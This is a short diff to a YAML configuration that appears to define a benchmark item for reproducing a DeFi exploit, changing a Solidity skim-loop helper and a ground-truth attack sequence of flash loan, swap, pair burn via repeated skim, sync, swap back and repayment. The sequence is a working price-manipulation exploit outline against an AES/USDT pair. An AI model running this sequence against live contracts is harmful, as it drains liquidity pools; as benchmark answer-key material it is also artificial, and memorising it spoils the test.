@@ -23,7 +23,7 @@ ctrt_name2deploy:
 extra_actions:
   - "function burn_pair_aes(uint256 amount) internal {
     aes.transfer(address(pair), amount);
-    for (uint256 i = 0; i < 7; i++) {
+    for (uint256 i = 0; i < 19; i++) {
     pair.skim(address(pair));
     }
     pair.skim(attacker);
@@ -40,7 +40,7 @@ attack_goal_str: "usdt"
 groundtruth:
   - ["borrow", "usdt", "100000e18"]
   - ["swap", "pair", "usdt", "aes", "usdt.balanceOf(attacker)"]
-  - ["burn", "pair", "aes", "aes.balanceOf(attacker) / 2"]
+  - ["burn", "pair", "aes", "aes.balanceOf(pairAddr)"]
   - ["sync", "pair"]
   - ["swap", "pair", "aes", "usdt", "aes.balanceOf(attacker)"]
   - ["payback", "usdt", "100000e18 * 1003 / 1000"]
